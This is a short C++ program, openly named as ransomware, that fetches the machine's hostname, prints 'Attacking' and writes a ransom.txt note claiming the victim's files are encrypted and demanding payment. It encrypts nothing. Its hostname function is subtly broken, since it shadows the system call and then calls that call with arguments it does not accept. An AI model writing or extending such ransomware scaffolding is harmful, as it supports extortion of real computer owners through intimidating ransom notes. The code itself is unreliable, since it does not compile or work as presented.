#include <iostream>
#include <fstream>
#include <string>

std::string gethostname() {
    #ifdef _WIN32
        char hostname[50];
        gethostname(hostname, 49);
        return std::string(hostname);
    #else
        return "Unknown";
    #endif
}

void ransomware(std::string victim) {
    std::ofstream outfile;
    outfile.open("ransom.txt");

    if (outfile.is_open()) {
        outfile << "Your files have been encrypted!\n";
        outfile << "Pay the ransom to get the decryption key.\n";
        outfile << "Victim: " << victim << "\n";
        outfile.close();
    } else {
        std::cerr << "Unable to create file\n";
    }
}

int main() {
    std::string hostname = gethostname();
    std::cout << "Attacking " << hostname << "\n";
    ransomware(hostname);

    return 0;
}
